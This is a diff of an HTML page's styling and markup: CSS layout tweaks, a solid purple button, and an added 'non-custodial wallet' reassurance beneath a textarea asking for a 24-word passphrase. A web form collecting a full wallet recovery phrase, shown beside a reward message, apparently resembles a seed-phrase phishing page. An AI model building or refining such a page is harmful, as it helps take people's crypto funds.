@@ -134,21 +134,25 @@ body {
             font-weight: bold;
             margin-bottom: 15px;
             color: #333;
+            text-align: center; /* Centers the heading */
         }
 
         .input-box {
-            width: 100%;
-            height: 100px;
+            width: 95%; /* Increase width to match the reference image */
+            height: 120px; /* Adjust height to be taller */
             padding: 12px;
             font-size: 16px;
             border: 1px solid #ddd;
             border-radius: 5px;
             margin-bottom: 15px;
             resize: none;
+            display: block;
+            margin-left: auto;
+            margin-right: auto; /* Ensures it's centered */
         }
 
         .purple-btn {
-            background: linear-gradient(90deg, #6A0DAD, #A020F0);
+            background-color: #6A0DAD; /* Solid purple background */
             color: white;
             padding: 12px;
             font-size: 18px;
@@ -159,6 +163,7 @@ body {
             font-weight: bold;
             transition: all 0.3s ease-in-out;
         }
+        
 
         .purple-btn:hover {
             transform: scale(1.05);
@@ -169,6 +174,14 @@ body {
             font-weight: bold;
             color: #2E8B57;
             margin-top: 15px;
+        }
+        
+        .non-custodial-message {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+            max-width: 90%;
         }
 
     </style>
@@ -229,6 +242,9 @@ body {
             <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>
             <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
             <p id="message" class="reward-text"></p>
+            <p class="non-custodial-message">
+               As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+            </p>
         </div>
     </div>
         <script>
